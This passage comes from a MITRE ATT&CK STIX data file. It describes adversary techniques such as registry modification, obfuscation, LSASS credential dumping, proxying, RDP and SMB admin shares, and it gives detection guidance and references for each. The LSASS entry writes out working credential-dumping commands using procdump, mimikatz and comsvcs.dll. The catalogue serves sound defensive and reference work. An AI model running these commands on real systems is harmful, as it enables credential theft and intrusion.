                    "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
                    "source_name": "Elastic Masquerade Ball"
                },
                {
                    "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
                    "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
                    "source_name": "Twitter ItsReallyNick Masquerading Update"
                },
                {
                    "url": "https://docs.docker.com/engine/reference/commandline/images/",
                    "description": "Docker. (n.d.). Docker Images. Retrieved April 6, 2021.",
                    "source_name": "Docker Images"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Modify Registry",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Process: OS API Execution",
                "Command: Command Execution",
                "Windows Registry: Windows Registry Key Creation",
                "Windows Registry: Windows Registry Key Modification",
                "Windows Registry: Windows Registry Key Deletion"
            ],
            "x_mitre_version": "1.2",
            "modified": "2020-08-13T20:02:49.641Z",
            "created": "2017-05-31T21:31:23.587Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
            "x_mitre_defense_bypassed": [
                "Host forensic analysis"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User",
                "Administrator",
                "SYSTEM"
            ],
            "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
            "x_mitre_contributors": [
                "Bartosz Jerzman",
                "Travis Smith, Tripwire",
                "David Lu, Tripwire"
            ],
            "x_mitre_detection": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1112",
                    "external_id": "T1112",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/203.html",
                    "external_id": "CAPEC-203",
                    "source_name": "capec"
                },
                {
                    "source_name": "Microsoft Reg",
                    "description": "Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.",
                    "url": "https://technet.microsoft.com/en-us/library/cc732643.aspx"
                },
                {
                    "source_name": "Microsoft Reghide NOV 2006",
                    "description": "Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.",
                    "url": "https://docs.microsoft.com/sysinternals/downloads/reghide"
                },
                {
                    "source_name": "TrendMicro POWELIKS AUG 2014",
                    "description": "Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.",
                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/"
                },
                {
                    "source_name": "SpectorOps Hiding Reg Jul 2017",
                    "description": "Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.",
                    "url": "https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353"
                },
                {
                    "source_name": "Microsoft Remote",
                    "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.",
                    "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx"
                },
                {
                    "source_name": "Microsoft 4657 APR 2017",
                    "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.",
                    "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657"
                },
                {
                    "source_name": "Microsoft RegDelNull July 2016",
                    "description": "Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.",
                    "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Obfuscated Files or Information",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "File: File Metadata",
                "File: File Creation",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-20T16:33:13.472Z",
            "created": "2017-05-31T21:30:32.662Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_defense_bypassed": [
                "Host forensic analysis",
                "Signature-based detection",
                "Host intrusion prevention systems",
                "Application control",
                "Log analysis",
                "Application control by file name or path"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
            "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
            "x_mitre_contributors": [
                "Red Canary",
                "Christiaan Beek, @ChristiaanBeek"
            ],
            "x_mitre_detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1027",
                    "external_id": "T1027",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/267.html",
                    "external_id": "CAPEC-267",
                    "source_name": "capec"
                },
                {
                    "source_name": "Volexity PowerDuke November 2016",
                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
                },
                {
                    "source_name": "Linux/Cdorked.A We Live Security Analysis",
                    "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
                    "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/"
                },
                {
                    "source_name": "Carbon Black Obfuscation Sept 2016",
                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
                },
                {
                    "source_name": "FireEye Obfuscation June 2017",
                    "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html"
                },
                {
                    "source_name": "FireEye Revoke-Obfuscation July 2017",
                    "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf"
                },
                {
                    "source_name": "PaloAlto EncodedCommand March 2017",
                    "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
                },
                {
                    "source_name": "GitHub Revoke-Obfuscation",
                    "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
                    "url": "https://github.com/danielbohannon/Revoke-Obfuscation"
                },
                {
                    "source_name": "GitHub Office-Crackros Aug 2016",
                    "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
                    "url": "https://github.com/itsreallynick/office-crackros"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Tool",
            "x_mitre_data_sources": [
                "Malware Repository: Malware Metadata"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-10-17T16:17:55.499Z",
            "created": "2020-10-01T02:08:33.977Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "resource-development"
                }
            ],
            "x_mitre_platforms": [
                "PRE"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
            "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
            "x_mitre_contributors": [
                "SOCCRATES",
                "Mnemonic AS"
            ],
            "x_mitre_detection": "In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1588/002",
                    "external_id": "T1588.002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://www.recordedfuture.com/identifying-cobalt-strike-servers/",
                    "description": "Recorded Future. (2019, June 20). Out of the Blue: How Recorded Future Identified Rogue Cobalt Strike Servers. Retrieved October 16, 2020.",
                    "source_name": "Recorded Future Beacon 2019"
                },
                {
                    "url": "https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/",
                    "description": "Maynier, E. (2020, December 20). Analyzing Cobalt Strike for Fun and Profit. Retrieved October 12, 2021.",
                    "source_name": "Analyzing CS Dec 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "LSASS Memory",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Process: Process Access",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-10-15T19:55:01.368Z",
            "created": "2020-02-11T18:41:44.783Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "credential-access"
                }
            ],
            "id": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "Administrator",
                "SYSTEM"
            ],
            "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
            "x_mitre_contributors": [
                "Edward Millington",
                "Ed Williams, Trustwave, SpiderLabs"
            ],
            "x_mitre_detection": "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1003/001",
                    "external_id": "T1003.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
                    "description": "Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities. Retrieved March 3, 2021.",
                    "source_name": "Volexity Exchange Marauder March 2021"
                },
                {
                    "url": "https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf",
                    "description": "Symantec. (2021, June 10). Attacks Against the Government Sector. Retrieved September 28, 2021.",
                    "source_name": "Symantec Attacks Against Government Sector"
                },
                {
                    "source_name": "Graeber 2014",
                    "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
                    "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html"
                },
                {
                    "source_name": "TechNet Blogs Credential Protection",
                    "description": "Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.",
                    "url": "https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/"
                },
                {
                    "source_name": "Medium Detecting Attempts to Steal Passwords from Memory",
                    "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.",
                    "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea"
                },
                {
                    "source_name": "Powersploit",
                    "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
                    "url": "https://github.com/mattifestation/PowerSploit"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Proxy",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Flow",
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "3.1",
            "modified": "2021-08-30T19:16:11.648Z",
            "created": "2017-05-31T21:31:08.479Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows",
                "Network"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
            "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
            "x_mitre_contributors": [
                "Jon Sheedy",
                "Heather Linn",
                "Walker Johnson"
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1090",
                    "external_id": "T1090",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Trend Micro APT Attack Tools",
                    "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
                    "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Remote Desktop Protocol",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1021/001",
                    "external_id": "T1021.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/555.html",
                    "external_id": "CAPEC-555",
                    "source_name": "capec"
                },
                {
                    "source_name": "TechNet Remote Desktop Services",
                    "description": "Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.",
                    "url": "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx"
                },
                {
                    "source_name": "Alperovitch Malware",
                    "description": "Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.",
                    "url": "http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/"
                }
            ],
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Flow",
                "Logon Session: Logon Session Creation"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-02-25T19:23:34.204Z",
            "x_mitre_system_requirements": [
                "RDP service enabled, account in the Remote Desktop Users group"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "lateral-movement"
                }
            ],
            "id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "Remote Desktop Users",
                "User"
            ],
            "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) technique for Persistence.(Citation: Alperovitch Malware)",
            "x_mitre_contributors": [
                "Matthew Demaske, Adaptforward"
            ],
            "x_mitre_detection": "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",
            "created": "2020-02-11T18:23:26.059Z",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "SMB/Windows Admin Shares",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Flow",
                "Logon Session: Logon Session Creation",
                "Network Share: Network Share Access"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-03-23T21:16:02.812Z",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "created": "2020-02-11T18:25:28.212Z",
            "id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "lateral-movement"
                }
            ],
            "x_mitre_detection": "Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)",
            "x_mitre_system_requirements": [
                "SMB enabled; Host/network firewalls not blocking SMB ports between source and destination; Use of domain account in administrator group on remote system or default system admin account."
            ],
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1021/002",
                    "external_id": "T1021.002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/561.html",
                    "external_id": "CAPEC-561",
                    "source_name": "capec"
                },
                {
                    "source_name": "Wikipedia Server Message Block",
                    "description": "Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.",
                    "url": "https://en.wikipedia.org/wiki/Server_Message_Block"
                },
                {
                    "source_name": "TechNet RPC",
                    "description": "Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.",
                    "url": "https://technet.microsoft.com/en-us/library/cc787851.aspx"
                },
                {
                    "source_name": "Microsoft Admin Shares",
                    "description": "Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.",
                    "url": "http://support.microsoft.com/kb/314984"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts",
                    "description": "Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.",
                    "source_name": "Lateral Movement Payne"
                },
                {
                    "source_name": "Windows Event Forwarding Payne",
                    "description": "Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.",
